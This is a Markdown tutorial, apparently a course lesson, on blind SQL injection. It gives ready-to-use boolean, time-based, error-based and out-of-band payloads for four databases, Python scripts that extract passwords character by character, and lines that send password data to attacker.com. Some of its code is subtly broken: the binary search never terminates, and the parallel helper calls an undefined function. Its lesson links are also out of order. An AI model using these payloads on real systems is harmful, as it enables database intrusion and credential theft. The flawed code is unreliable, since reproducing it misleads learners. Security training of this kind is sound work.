# 08 - Blind SQL Injection

## When Union Fails

Blind SQL injection occurs when:

- Error messages suppressed
- Union SELECT blocked
- No direct output visible
- Page response identical for true/false

**But**: database still evaluates our injected logic!

## Boolean-Based Blind

### The Principle

```
True condition  → Page A (normal)
False condition → Page B (different)
```

**Key**: Even one character difference = exploitable!

### Basic Boolean Payloads

```sql
-- Check: Is first letter of version '5'?
' AND SUBSTRING(@@version,1,1)='5'--

-- Check: Does table 'users' exist?
' AND (SELECT COUNT(*) FROM information_schema.tables
       WHERE table_name='users')>0--

-- Check: Is first user 'admin'?
' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,5)='admin'--
```

### Character Extraction Process

```python
# Pseudocode for manual extraction
def extract_string(query, max_length=100):
    result = ""
    for position in range(1, max_length + 1):
        for char_code in range(32, 127):  # Printable ASCII
            payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))={char_code}--"
            if send_request(payload) == "TRUE_RESPONSE":
                result += chr(char_code)
                print(f"Extracted: {result}")
                break
        else:
            # No character found = end of string
            break
    return result

# Usage
extract_string("SELECT @@version")
extract_string("SELECT database()")
extract_string("SELECT password FROM users WHERE username='admin'")
```

## Binary Search Optimization

### Why Binary Search?

| Method             | Tests per Character |
| ------------------ | ------------------- |
| Sequential (1-128) | Up to 95            |
| Binary search      | Up to 7             |

**Speedup**: ~13x faster!

### Binary Search Algorithm

```python
def binary_search_char(query, position):
    low = 32   # Space
    high = 126 # ~
    while low <= high:
        mid = (low + high) // 2
        # Test: Is char >= mid?
        payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))>={mid}--"
        if send_request(payload) == "TRUE":
            # Char is in upper half
            low = mid
        else:
            # Char is in lower half
            high = mid - 1
    return chr(low)
```

### SQL Implementation

```sql
-- Check if char >= 80
' AND ASCII(SUBSTRING(@@version,1,1))>=80--

-- Refine: char >= 90?
' AND ASCII(SUBSTRING(@@version,1,1))>=90--

-- Continue until exact match
```

## Time-Based Blind

### When Boolean Fails

If page response **identical** for true and false, use time as boolean.

```
Condition True:  Response normal (< 1 second)
Condition False: Response normal (< 1 second)
Test Payload:    Response delayed (5 seconds) = True
```

### Time Payloads

#### MySQL

```sql
-- Basic delay
' AND SLEEP(5)--

-- Conditional delay
' AND IF(ASCII(SUBSTRING(@@version,1,1))=53, SLEEP(5), 0)--

-- BENCHMARK delay (CPU intensive, works on old MySQL)
' AND BENCHMARK(5000000,SHA1(1))--
```

#### PostgreSQL

```sql
-- Basic delay
'; SELECT pg_sleep(5)--

-- Conditional delay
' AND CASE WHEN (ASCII(SUBSTRING(version(),1,1))=80)
    THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Heavy query delay
' AND (SELECT COUNT(*) FROM pg_class
       CROSS JOIN pg_class t2 CROSS JOIN pg_class t3) > 0--
```

#### MSSQL

```sql
-- Basic delay
'; WAITFOR DELAY '0:0:5'--

-- Conditional delay
'; IF (ASCII(SUBSTRING(@@VERSION,1,1))=77)
    WAITFOR DELAY '0:0:5'--
```

#### Oracle

```sql
-- Basic delay
' AND DBMS_LOCK.SLEEP(5)--

-- Alternative (heavy query)
' AND (SELECT COUNT(*) FROM all_objects
       CROSS JOIN all_objects t2) > 0--

-- Conditional
' AND CASE WHEN (ASCII(SUBSTR((SELECT banner FROM v$version),1,1))=79)
    THEN DBMS_LOCK.SLEEP(5) ELSE 0 END--
```

## Advanced Blind Techniques

### Out-of-Band (OOB) Extraction

When firewall blocks inbound but allows outbound:

```sql
-- MySQL DNS exfiltration
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a.txt'))--

-- PostgreSQL HTTP request
' COPY (SELECT password FROM users) TO
  PROGRAM 'curl http://attacker.com/?data='||(SELECT password FROM users)--

-- MSSQL HTTP request
'; EXEC master..xp_dirtree
  '\\attacker.com\'+(SELECT password FROM users)--
```

**Note**: Requires network egress and attacker-controlled infrastructure.

### Conditional Errors

Use error as boolean when delay is not reliable:

```sql
-- MySQL: Force error if condition true
' AND (SELECT CASE WHEN (ASCII(SUBSTRING(@@version,1,1))=53)
    THEN 1/0 ELSE 1 END)--

-- PostgreSQL: Cast error
' AND (SELECT CASE WHEN (1=1) THEN
    CAST((SELECT password FROM users) AS INT) ELSE 1 END)--
```

## Automating Blind SQL Injection

### Custom Python Script

```python
import requests
import time
import string

class BlindSQLi:
    def __init__(self, url, true_indicator, false_indicator):
        self.url = url
        self.true_indicator = true_indicator
        self.false_indicator = false_indicator

    def test_condition(self, payload):
        response = requests.get(self.url + payload)
        return self.true_indicator in response.text

    def extract_char(self, query, position):
        for char in string.printable:
            payload = f"' AND SUBSTRING(({query}),{position},1)='{char}'--"
            if self.test_condition(payload):
                return char
        return None

    def extract_string(self, query, max_length=100):
        result = ""
        for i in range(1, max_length + 1):
            char = self.extract_char(query, i)
            if not char:
                break
            result += char
            print(f"Progress: {result}")
        return result

# Usage
sqli = BlindSQLi(
    url="http://target.com/page?id=1",
    true_indicator="Welcome",
    false_indicator="Error"
)
version = sqli.extract_string("SELECT @@version")
```

## Performance Optimization

### Multi-Threading

```python
from concurrent.futures import ThreadPoolExecutor

def extract_char_parallel(query, position, max_workers=8):
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(test_char, query, position, char): char
            for char in range(32, 127)
        }
        for future in futures:
            if future.result():
                return chr(futures[future])
    return None
```

### Payload Efficiency

| Query             | Time per Request | Est. Speed    |
| ----------------- | ---------------- | ------------- |
| Simple boolean    | 0.5s             | ~2 char/sec   |
| Time-based (5s)   | 5s               | ~0.2 char/sec |
| Binary search     | 0.5s × 7         | ~0.3 char/sec |
| Binary + parallel | ~0.5s            | ~2 char/sec   |

## Practice Challenges

### Challenge 1: Boolean Extraction

Target: `http://target.com/profile?id=1`

Characteristics:

- No error messages
- True = "Profile found"
- False = "Profile not found"

Extract: database name (use boolean logic)

### Challenge 2: Time-Based

Target: `http://target.com/api/data`

Characteristics:

- JSON response, always identical structure
- No visible difference true/false

Extract: First 5 characters from version

### Challenge 3: Binary Search

Implement binary search algorithm to extract table names 3x faster.

## Key Takeaways

1. **Blind SQL injection** = no output, but logic still executes
2. **Boolean** = fastest if visible differences exist
3. **Time-based** = universal, but slow
4. **Binary search** = essential for efficiency
5. **Automation** = required for practical exploitation

## Next Step

Continue to [05 - Database Fingerprinting](05-Database-Fingerprinting.md) to identify target characteristics.
